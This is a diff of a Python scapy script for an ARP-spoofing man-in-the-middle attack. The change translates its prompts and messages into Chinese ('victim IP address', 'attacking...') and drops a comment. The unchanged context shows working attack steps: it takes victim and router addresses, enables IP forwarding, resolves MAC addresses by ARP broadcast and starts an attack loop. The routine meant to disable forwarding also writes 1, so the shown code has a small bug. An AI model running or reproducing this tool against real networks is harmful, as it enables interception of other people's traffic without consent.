@@ -4,23 +4,24 @@ import sys
 from scapy.all import *
 
 def getInfo():
-	print("~~~Getting addresses...")
-	interface = raw_input("Interface:")
-	victimIP = raw_input("Victim IP:")
-	routerIP = raw_input("Router IP:")
+	print("请输入需要填写的信息：")
+	interface = raw_input("使用接口的名称为:")
+	victimIP = raw_input("受害者IP地址:")
+	routerIP = raw_input("路由器IP地址:")
 	return [interface, victimIP, routerIP]
 
 def setIPForwarding(toggle):
 	if(toggle == True):
-		print("~~~Turing on IP forwarding...")
+		print("正在开启IP转发...")
+
 		os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
 	if(toggle == False):
-		print("~~~Turing off IP forwarding...")
+		print("正在关闭IP转发...")
+
 		os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
 
 def get_MAC(ip, interface):
-	
-	# srp() send/recive packets at layer 2 (ARP)
+
 	answer, unanswer = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip), timeout = 2, iface=interface, inter = 0.1)
 
 	for send,recieve in answer:
@@ -65,9 +66,9 @@ def manInTheMiddle():
 		print(e)
 		sys.exit(1)
 
-	print("~~~Victim MAC: %s" % victimMAC)
-	print("~~~Router MAC: %s" % routerMAC)
-	print("~~~Attacking...")
+	print("受害者的MAC地址为: %s" % victimMAC)
+	print("路由器的MAC地址为: %s" % routerMAC)
+	print("攻击中...")
 
 	while True:
 		try:
